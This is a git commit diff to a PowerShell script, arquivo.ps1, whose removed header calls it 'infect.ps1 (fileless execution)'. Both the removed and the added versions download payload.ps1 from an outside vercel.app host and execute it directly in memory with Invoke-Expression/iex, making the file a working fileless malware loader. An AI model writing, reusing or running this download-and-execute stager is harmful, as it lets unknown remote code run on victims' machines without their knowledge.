fe2f6e7b768539388f2f332e59532b49aed07bac
Gabriel Rebouças <89884709+gabrielreboucas2001@users.noreply.github.com>
2025-07-15 22:28:21 -0300

    Update arquivo.ps1

--- arquivo.ps1
+++ arquivo.ps1
@@ -1,13 +1,3 @@
-# infect.ps1 (fileless execution)
 $payload = "https://testando123-blond.vercel.app/payload.ps1"
-
-try {
-    # Baixa o conteúdo do script remoto como texto
-    $script = Invoke-WebRequest -Uri $payload -UseBasicParsing | Select-Object -ExpandProperty Content
-
-    # Executa o conteúdo diretamente na memória
-    Invoke-Expression $script
-}
-catch {
-    Write-Host "Erro ao carregar o payload: $_"
-}
+$bytes = Invoke-WebRequest -Uri $payload -UseBasicParsing | Select-Object -ExpandProperty Content
+iex ([System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($bytes)))
